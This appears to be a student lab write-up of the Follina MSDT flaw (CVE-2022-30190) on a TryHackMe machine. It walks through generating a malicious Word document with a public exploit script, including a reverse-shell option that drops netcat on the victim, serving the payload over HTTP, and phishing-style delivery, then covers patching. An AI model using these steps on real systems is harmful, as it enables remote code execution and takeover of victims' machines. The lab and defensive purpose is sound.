## Vulnerability Demonstration: “Follina”

1. Explanation of Vulnerability
- ** 1)	Affects Microsoft Windows Support Diagnostic Tool (MSDT).
- ** 2)	Activated when MSDT is invoked via a URL protocol from an application such as Microsoft Word.
- ** 3)	Involves crafting a malicious document that, when opened, uses MSDT to execute arbitrary code.
- ** 4)	Executes code with the privileges of the application that calls MSDT.
- ** 5)	Does not require macros to be enabled, increasing the risk since opening a document can lead to exploitation.
- ** 6)	Allows attackers to potentially take control of the affected system.
2. Overview of system setup
- ** 1)	Windows Server: Utilize a vulnerable Windows Server hosted on TryHackMe, specifically set up to exhibit the Follina MSDT flaw. Create an account and search for “msdt-Follina” vulnerability to exploit. Under Task 4: Exploiting the Follina Windows Vulnerability, click “Start Machine” (Attached is the link to source: TryHackMe | Follina MSDT).
2)	Kali Linux VM: Configure Kali Linux on a local VMware to act as the attacker's system. (Attached is the source to get Kali ISO file: Get Kali | Kali Linux  and VMware setup file: Download VMware Workstation Pro)
3)	Network Setup: 
•	Attacking machine remotely sends the malicious file from any social engineering attacks like phishing. Since this is only for demonstration purpose, ensure both systems are networked correctly to communicate via OpenVPN. 
•	To do so, go to TryHackMe website navigate to Access > Machines > VPN server, from the drop down select “IN-Regular-1” and download the configuration file and send it to Kali machine. Type “sudo openvpn downloadedfile.ovpn” in the command prompt of the attacking machine from its file location.
4)	Exploitation Tools: Equip the Kali machine with necessary exploitation tools for crafting and sending the malicious document (Metasploit).
5)	Test and Observe: Execute the attack by sending the malicious document from Kali to the Windows server and monitor the exploitation process and outcomes.
                     
            Figure 1: Description of the MSDT vulnerability
3. Clarity of demonstration of exploit
1)	Clone Repository: Obtain the exploit code from John Hammond's GitHub - GitHub - JohnHammond/msdt-follina: Codebase to generate an msdt-follina payload
(Note: This code is intended for educational purposes only. It is designed for use in controlled environments such as cybersecurity training and research to help understand and mitigate security vulnerabilities responsibly.)
2)	Execute Script: Run follina.py to generate the malicious Word document. Use optional flags like --command to specify the payload command.
•	For example, to pop calc.exe: $ python3 follina.py
•	To pop notepad.exe: $ python follina.py -c “notepad.exe”
•	To open reverse shell: $ python3 follina.py -r 9001 (Note: This downloads a netcat binary onto the victim and places it in C:\Windows\Tasks. It does not clean up the binary. This will trigger antivirus detections unless AV is disabled.)
3)	Serve Payload: The script sets up an HTTP server to host the payload, available on the specified port 8000.
4)	Distribute Document: Make the malicious Word document available to the victim, either via direct transfer or network download.
•	Attacking machine remotely sends the malicious file from any social engineering attacks like phishing. Since this is only for demonstration purpose, we ensure both systems are networked correctly to communicate via OpenVPN. 
•	Start a HTTP server on port 8080 from the folder where the malicious Word document is generated for file transfer.
•	To do so type the following command: “python3 -m http.server 8080”.
•	Now from the victim machine access the malicious file by navigating to http://attackingmachineIP:8080 from any browser and download the “follina.doc” file.
5)	Document Execution: Victim opens the document, triggering the exploit via the embedded malicious link. 
 
Figure 2: Left image shows the victim opening the malicious document and “calc.exe” being executed, Right image shows the execution of “follina.py” file from the attacking machine.
4. Exploitation failure
1)	Check Configuration: Ensure that the system configurations and network settings allow the exploit to reach the target machine.
2)	Review Payload: Verify the payload syntax and the integrity of the malicious file to confirm it is correctly configured to trigger the exploit.
3)	Update Tools: Ensure that all tools and scripts used for exploitation are up-to-date and compatible with the target's operating system version.
4)	Monitor Logs: Examine system and network logs for errors or alerts that could indicate why the exploitation attempt failed.
5. Demonstration of patch
1)	Identify Patch: Locate the specific Microsoft security update that addresses CVE-2022-30190. (attached is the link to find the patch update: CVE-2022-30190 - Security Update Guide - Microsoft - Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code Execution Vulnerability )
2)	Educated Guess: Microsoft patch might include disabling URL protocol invocation within office applications, modifying the MSDT operation context, patching specific exploits in the code, and enhancing security checks.
3)	Apply Patch: Install this security update on all affected systems to patch the vulnerability.
4)	Verify Security: Test the system to ensure the patch has been successfully applied and the vulnerability is mitigated.
5)	Ongoing Monitoring: Regularly check for updates and monitor systems for any unusual activities to ensure continued protection.
